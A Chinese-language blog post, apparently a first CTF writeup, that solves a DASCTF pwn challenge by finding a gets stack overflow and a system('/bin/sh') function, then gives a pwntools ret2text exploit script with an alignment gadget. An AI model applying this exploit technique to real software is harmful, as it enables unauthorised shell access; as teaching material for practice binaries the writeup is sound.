---
title: 我的第一道pwn题目 rip
date: 2026-10-20 18:18:50
updated: 2026-10-20 18:18:50
description: "第一次写 writeup。从 DASCTF 的一道 pwn 入门题入手，一步步走完 file、checksec、nm、strings、objdump 的信息收集，确认 gets 栈溢出漏洞，构造 payload 跳到 system(\"/bin/sh\") 拿到 shell。"
tags:
  - pwn
  - ret2text
  - stack-overflow
categories:
  - CTF
series: ""
order:
---

第一次写 writeup。

<!-- more -->

在 <https://ctf2.dasctf.com/dashboard> 拿到一个 pwn 的简单入门赛题哦。

## 准备环境

在 wsl 里，先创造一个存放题目的目录，把下载下来的二进制文件放进去，然后进入这个目录。

## 信息收集

### 看看文件成分

```bash
file chall1
```

```text
chall1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
```

好消息是 not stripped：文件保留了函数名、全局变量名等符号信息，省力好多。

### 看看这个二进制文件有哪些保护措施

```bash
checksec --file=chall1
```

```text
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols             FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   64 Symbols    No    0               1               chall1
```

观察一下：

- **Canary**：No canary found。Canary 是放在栈上、用于检测栈缓冲区溢出的一个值，没有 canary，即没有针对栈溢出的检测，存在栈溢出的风险。
- **NX**：NX disabled。NX 指的是数据区域（比如栈）能不能被执行，disabled 就是栈等区域可以执行、能直接在栈上跑 shellcode。（不过本题我们走的是 ret2text——返回到程序里已有的 fun 函数，并没有真的用到这一点。）
- **PIE**：No，程序自身的代码地址通常是固定的，不会因为每次运行而改变。正因为地址固定，后面我们才能把 fun 的地址直接写死进 payload，不用先泄露地址。

目前这个题目这三点比较重要。

### 看看有哪些函数

```bash
nm chall1 | grep ' T \| t '
```

nm：查看 ELF 文件的符号表，因为前面说过的 not stripped，所以可以直接查看。`grep ' T \| t '` 找一下关键的一些函数名。grep 其实就是提一点要求，很多地方用到。

```text
0000000000401186 T fun
0000000000401142 T main
```

这个 fun 确实有一点 fun。

### 找危险字符串

```bash
strings chall1
```

这个的直接输出就好长一段了，可以给这个命令增加一点要求，如 `strings chall1 | grep -iE 'sh|system|/bin'`，但是呢，后面要是出现一些加密，也会漏掉一些信息。在这个题目中的关键信息就是字符串里有 `/bin/sh` 和 `system`。可以推断一下 system("/bin/sh") 的存在：

```text
system
/bin/sh
system@@GLIBC_2.2.5
.shstrtab
.gnu.hash
```

## 反汇编分析

接下来进行反汇编：

```bash
objdump -d -M intel chall1
```

因为我们前面发现了 system 和 /bin/sh，猜测是不是有谁调用了 system，于是去找 call system。有一大串东西，仔细阅读，找 main、fun 和危险函数，如 gets、read、strcpy、printf。这里你就会发现：

在 `0000000000401142 <main>`：

```asm
401156:       48 8d 45 f1             lea    rax,[rbp-0xf]
40115a:       48 89 c7                mov    rdi,rax
40115d:       b8 00 00 00 00          mov    eax,0x0
401162:       e8 e9 fe ff ff          call   401050 <gets@plt>
```

缓冲区：`rbp-0xf`　危险函数：gets。

在 `0000000000401186 <fun>`：

```asm
40118a:       48 8d 3d 8a 0e 00 00    lea    rdi,[rip+0xe8a]        # 40201b <_IO_stdin_used+0x1b>
401191:       e8 aa fe ff ff          call   401040 <system@plt>
```

所以 call system 在 fun 函数里，rdi 被设成了 0x40201b（# 40201b 是反汇编工具计算出来的目标地址）。
小知识：`call xxx@plt` = 调用一个函数，函数名就是 xxx，带 @plt 说明调的是外部库函数。`system@plt` 就是在调 system 这个函数。在 64 位 Linux 里，函数的第 1 个参数永远先放进 rdi。
而现在塞进 rdi 的，是 40201b，有理由怀疑是 /bin/sh。

我们进行 gdb：

```bash
gdb ./chall1
```

进入 gdb 后，用 `x/s` 从这个地址读一个字符串：

```text
x/s 0x40201b
0x40201b:       "/bin/sh"
```

x/s 就是从这个运行时地址读一个字符串。发现果然是 /bin/sh，破案！fun 里是 system("/bin/sh") 后门。

综合分析：调用 system，参数（rdi）指向 `/bin/sh`，所以 fun 实际上就是 `system("/bin/sh")`。

## 确认漏洞与思路

gets 很危险，读取用户输入时，不检查目标缓冲区的大小，而我们的偏移量大小为 8+15。

构造 payload：`[ 填充 23 字节 ] + [ 8 字节对齐 ret ] + [ 8 字节返回地址 = fun 的地址 ]`。

这里多垫的那个“对齐 ret”要解释一下：新版 glibc 的 system 内部用到了 movaps 这类 SSE 指令，要求被调用时栈是 16 字节对齐的。而我们靠栈溢出返回进 fun 时，栈的对齐被打乱了（偏了 8 字节），少这一个 ret 的话，程序会在 system 内部的 movaps 处直接崩掉。所以先返回到一个“单独的 ret”，让它再 ret 一次、把栈指针挪 8 字节、重新对齐，然后才跳进 fun，这样 system 就能正常执行。

那个单独的 ret 从哪来？它就是程序里一条孤立的 `ret` 指令的地址（0x401198，落在 fun 函数尾部，0x401186 + 0x12）；也可以用 `ROPgadget --binary chall1 | grep ': ret'` 搜一个，随便挑一个单独的 ret 都行。

## 编写并运行 exploit

写进文件：

```bash
cat > exploit.py << 'EOF'
from pwn import *

OFFSET     = 23
RET_GADGET = 0x401198      # 单独的 ret,修栈对齐
FUN_ADDR   = 0x401186      # system("/bin/sh")

payload = b'A'*OFFSET + p64(RET_GADGET) + p64(FUN_ADDR)

io = process("./chall1")   # ← 先本地
io.sendline(payload)
io.sendline(b"id")          # 测试命令,验证是否真拿到 shell
io.interactive()
EOF
```

运行：

```bash
python3 exploit.py
```

看到 `uid=1000`……成功！
